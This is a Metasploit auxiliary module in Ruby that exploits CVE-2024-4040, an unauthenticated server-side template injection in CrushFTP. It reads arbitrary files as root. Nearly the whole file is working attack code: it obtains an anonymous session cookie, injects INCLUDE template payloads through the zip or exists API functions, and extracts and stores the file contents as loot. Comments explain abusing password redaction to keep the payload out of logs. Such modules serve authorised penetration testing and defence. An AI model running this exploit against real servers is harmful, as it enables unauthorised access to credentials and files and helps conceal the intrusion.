##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'CrushFTP Unauthenticated Arbitrary File Read',
        'Description' => %q{
          This module leverages an unauthenticated server-side template injection vulnerability in CrushFTP < 10.7.1 and
          < 11.1.0 (as well as legacy 9.x versions). Attackers can submit template injection payloads to the web API without
          authentication. When attacker payloads are reflected in the server's responses, the payloads are evaluated. The
          primary impact of the injection is arbitrary file read as root, which can result in authentication bypass, remote
          code execution, and NetNTLMv2 theft (when the host OS is Windows and SMB egress traffic is permitted).
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'remmons-r7', # MSF Module & Rapid7 Analysis
        ],
        'References' => [
          ['CVE', '2024-4040'],
          ['URL', 'https://attackerkb.com/topics/20oYjlmfXa/cve-2024-4040/rapid7-analysis']
        ],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          # The CrushFTP.log file will contain a log of the HTTP requests
          # Similarly, files in logs/session_logs/ will contain a log of the HTTP requests
          # The sessions.obj file will temporarily persist details of recent requests
          'SideEffects' => [IOC_IN_LOGS],
          'Reliability' => []
        }
      )
    )

    register_options(
      [
        Opt::RPORT(8080),
        OptBool.new('STORE_LOOT', [true, 'Store the target file as loot', false]),
        OptString.new('TARGETFILE', [true, 'The target file to read. This can be a full path, a relative path, or a network share path (if firewalls permit). Files containing binary data may not be read accurately', 'users/MainUsers/groups.XML']),
        OptString.new('TARGETURI', [true, 'The URI path to CrushFTP', '/']),
        OptEnum.new('INJECTINTO', [true, 'The CrushFTP API function to inject into', 'zip', ['zip', 'exists']])
      ]
    )
  end

  def check
    # Unauthenticated requests to WebInterface endpoints should receive a response containing an 'anonymous' user session cookie
    res_anonymous_check = get_anon_session

    return Msf::Exploit::CheckCode::Unknown('Connection failed - unable to get 404 page response (confirm target and SSL settings)') unless res_anonymous_check

    # Confirm that the response returned a CrushAuth cookie and the status code was 404. If this is not the case, the target is probably not CrushFTP
    if (res_anonymous_check.code != 404) || !res_anonymous_check.get_cookies.include?('CrushAuth')
      return Msf::Exploit::CheckCode::Unknown('The application did not return a 404 response that provided an anonymous session cookie')
    end

    # Extract the CrushAuth anonymous session cookie value using regex
    crushauth_cookie = res_anonymous_check&.get_cookies&.match(/\d{13}_[A-Za-z0-9]{30}/)

    # The string "password" is included to invoke CrushFTP's sensitive parameter redaction in logs. The injection will be logged as "********"
    # NOTE: Due to an apparent bug in the way CrushFTP redacts data, if file paths contain ":", some of the injection will be leaked in logs
    res_template_inject = perform_template_injection(datastore['INJECTINTO'], '{user_name}password', crushauth_cookie)

    return Msf::Exploit::CheckCode::Unknown('Connection failed - unable to get template injection page response') unless res_template_inject

    # Confirm that the "{user_name}" template injection evaluates to "anonymous" in the response. If it does not, the application is not vulnerable
    unless res_template_inject.body.include?('anonymous')
      return Msf::Exploit::CheckCode::Safe('Server-side template injection failed - CrushFTP did not evaluate the injected payload')
    end

    Msf::Exploit::CheckCode::Vulnerable('Server-side template injection successful!')
  end

  def run
    # Unauthenticated requests to WebInterface endpoints should receive a response containing an 'anonymous' user session cookie
    print_status('Fetching anonymous session cookie...')
    res_anonymous = get_anon_session

    fail_with(Failure::Unknown, 'Connection failed - unable to get 404 page response') unless res_anonymous

    # Confirm that the response returned a CrushAuth cookie and the status code was 404. If this is not the case, the target is probably not CrushFTP
    if (res_anonymous&.code != 404) || res_anonymous&.get_cookies !~ /CrushAuth=([^;]+;)/
      fail_with(Failure::Unknown, 'The application did not return a 404 response that provided an anonymous session cookie')
    end

    # Extract the CrushAuth cookie value from the response 'Set-Cookie' data
    crushauth_cookie = res_anonymous&.get_cookies&.match(/\d{13}_[A-Za-z0-9]{30}/)

    file_name = datastore['TARGETFILE']

    print_status("Using template injection to read file: #{file_name}")

    # These tags will be used to identify the beginning and end of the file data in the response
    # The string "_pass_" is prepended to the injection to invoke CrushFTP sensitive parameter redaction in logs. The injection will be logged as "********"
    # NOTE: Due to an apparent bug in the way CrushFTP redacts data, if file paths contain ":", some of the injection will be leaked in logs
    file_begin_tag = '_pass_'
    file_end_tag = 'file-end'

    # Perform the template injection for file read
    res_steal_file = perform_template_injection(datastore['INJECTINTO'], "#{file_begin_tag}<INCLUDE>#{file_name}</INCLUDE>#{file_end_tag}", crushauth_cookie)

    # Check for failure conditions
    fail_with(Failure::Unknown, 'Connection failed - unable to perform template injection') unless res_steal_file

    if (res_steal_file&.code != 200) || !(res_steal_file.body.include? file_begin_tag)
      fail_with(Failure::Unknown, 'The application did not respond as expected - the response did not return a 200 status with file contents in the body')
    end

    if res_steal_file.body.include? "#{file_begin_tag}<INCLUDE>#{file_name}</INCLUDE>#{file_end_tag}"
      fail_with(Failure::NotFound, 'The requested file was not found - the target file does not exist or the system cannot read it')
    end

    # Isolate the file contents in the response by extracting data between the begin and end tags
    file_data = res_steal_file.body[res_steal_file.body.index(file_begin_tag) + file_begin_tag.length..]
    file_data = file_data.split(file_end_tag)[0]

    if datastore['STORE_LOOT']
      store_loot(File.basename(file_name), 'text/plain', datastore['RHOST'], file_data, file_name, 'File read from CrushFTP server')
      print_good('Stored the file data to loot...')
    else
      # A new line is sent before file contents for better readability
      print_good("File read succeeded! \n#{file_data}")
    end
  end

  # A GET request to /WebInterface/ should return a 404 response that contains an 'anonymous' user cookie
  def get_anon_session
    send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'WebInterface/')
    )
  end

  # The 'zip' API function is used here, but any unauthenticated API function that reflects parameter data in the response should work
  def perform_template_injection(page, payload, cookie)
    if page == 'zip'
      send_request_cgi(
        {
          'method' => 'POST',
          'uri' => normalize_uri(target_uri.path, 'WebInterface', 'function/'),
          'cookie' => "CrushAuth=#{cookie}",
          'headers' => { 'Connection' => 'close' },
          'vars_post' => {
            'command' => 'zip',
            # This value will be printed in responses to unauthenticated zip requests, resulting in template payload execution
            'path' => payload,
            'names' => '/',
            # The c2f parameter must be the last four characters of the primary session cookie
            'c2f' => cookie.to_s[-4..]
          }
        }
      )
    # The 'page' value is "exists"
    elsif page == 'exists'
      send_request_cgi(
        {
          'method' => 'POST',
          'uri' => normalize_uri(target_uri.path, 'WebInterface', 'function/'),
          'cookie' => "CrushAuth=#{cookie}",
          'headers' => { 'Connection' => 'close' },
          'vars_post' => {
            'command' => 'exists',
            # This value will be printed in responses to "exists" requests, resulting in template payload execution
            'paths' => payload,
            # The c2f parameter must be the last four characters of the primary session cookie
            'c2f' => cookie.to_s[-4..]
          }
        }
      )
    end
  end
end
